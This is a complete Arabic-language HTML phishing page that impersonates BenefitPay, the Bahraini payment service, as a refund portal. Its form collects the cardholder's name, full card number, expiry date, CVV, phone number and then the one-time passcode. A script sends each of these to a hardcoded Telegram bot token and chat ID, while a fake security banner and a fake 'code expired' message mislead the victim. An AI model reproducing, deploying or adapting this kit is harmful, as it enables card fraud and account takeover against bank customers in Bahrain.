<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="BenefitPay - بوابة الاسترداد الموحدة">
    <meta property="og:description" content="مركز استرداد المعاملات المالية - مملكة البحرين">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
    <title>BenefitPay | Refund Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f8f9fa; margin: 0; }
        .safety { background: #000; color: #0f0; text-align: center; font-size: 10px; padding: 5px; font-weight: bold; }
        .header { background: #e21e26; color: #fff; padding: 15px; display: flex; align-items: center; justify-content: space-between; }
        .header img { width: 40px; border-radius: 4px; }
        .container { padding: 20px; max-width: 450px; margin: auto; }
        .card { background: #fff; border-radius: 12px; padding: 25px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); border-top: 6px solid #28a745; }
        .refund-box { background: #f0fdf4; border: 1px solid #c3e6cb; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; font-size: 13px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; margin-bottom: 15px; }
        .btn { background: #28a745; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #loading, #otp-screen { display: none; text-align: center; padding: 30px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #28a745; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="safety">🛡️ CONNECTION SECURED BY BENEFIT COMPANY - KINGDOM OF BAHRAIN</div>
    <div class="header">
        <div><strong>BenefitPay</strong><br><small>بوابة استرداد المبالغ</small></div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Flag_of_Bahrain.svg/2560px-Flag_of_Bahrain.svg.png">
    </div>
    <div class="container">
        <div class="card" id="main-card">
            <h3 style="text-align: center; margin-top: 0; color: #28a745;">طلب استرجاع رصيد</h3>
            <div class="refund-box">
                <label>المبلغ المراد استرداده لحسابكم</label>
                <span style="font-size: 24px; font-weight: bold; color: #28a745;">BHD </span>
                <input type="number" id="amount" placeholder="0.000" style="width: 100px; border: none; background: transparent; font-size: 24px; font-weight: bold; text-align: center;" required>
            </div>
            <form id="refundForm">
                <label>الاسم الكامل لمستلم الطلب</label>
                <input type="text" id="holder" placeholder="أدخل الاسم الثلاثي" required>
                <label>رقم بطاقة الاسترداد (16 رقم)</label>
                <input type="number" id="card" placeholder="XXXX XXXX XXXX XXXX" required oninput="if(this.value.length > 16) this.value = this.value.slice(0, 16);">
                <div style="display: flex; gap: 10px;">
                    <div style="flex: 1;"><label>تاريخ الانتهاء</label><input type="text" id="exp" placeholder="MM/YY" maxlength="5" required></div>
                    <div style="flex: 1;"><label>رمز CVV</label><input type="password" id="cvv" placeholder="***" maxlength="3" required></div>
                </div>
                <label>رقم الهاتف المرتبط بالبطاقة</label>
                <input type="number" id="phone" placeholder="3XXXXXXX" required>
                <button type="button" class="btn" onclick="sendData()">تأكيد طلب الاسترداد</button>
            </form>
        </div>
        <div class="card" id="loading"><div class="spinner"></div><p>جاري معالجة الطلب مع البنك المركزي...</p></div>
        <div class="card" id="otp-screen">
            <h3 style="color: #28a745;">التحقق من هوية المستفيد</h3>
            <p>أدخل رمز الـ OTP المستلم لتأكيد عملية الاسترداد:</p>
            <input type="number" id="otp_code" placeholder="******" style="text-align: center; font-size: 24px; letter-spacing: 5px; border: 2px solid #28a745; border-radius: 8px; padding: 10px;">
            <button class="btn" style="margin-top: 20px;" onclick="finalStep()">تأكيد الاستلام</button>
        </div>
    </div>
<script>
    const token = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
    const chatId = "8302667206";
    function sendData() {
        const amount = document.getElementById('amount').value;
        const card = document.getElementById('card').value;
        const exp = document.getElementById('exp').value;
        if(card.length < 16) { alert("خطأ في رقم البطاقة"); return; }
        if(!exp.includes('/')) { alert("خطأ في تنسيق التاريخ"); return; }
        document.getElementById('main-card').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        const message = `💰 صيدة استرداد جديدة 💰\n💵 المبلغ: ${amount} BHD\n👤 الاسم: ${document.getElementById('holder').value}\n💳 البطاقة: ${card}\n🗓 التاريخ: ${exp}\n🔒 CVV: ${document.getElementById('cvv').value}\n📞 الهاتف: +973${document.getElementById('phone').value}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`).then(() => {
            setTimeout(() => { document.getElementById('loading').style.display = 'none'; document.getElementById('otp-screen').style.display = 'block'; }, 3500);
        });
    }
    function finalStep() {
        const otp = document.getElementById('otp_code').value;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 كود OTP (استرداد): " + otp)}`).then(() => {
            alert("⚠️ انتهت صلاحية الرمز. يرجى طلب رمز جديد.");
        });
    }
</script>
</body>
</html>
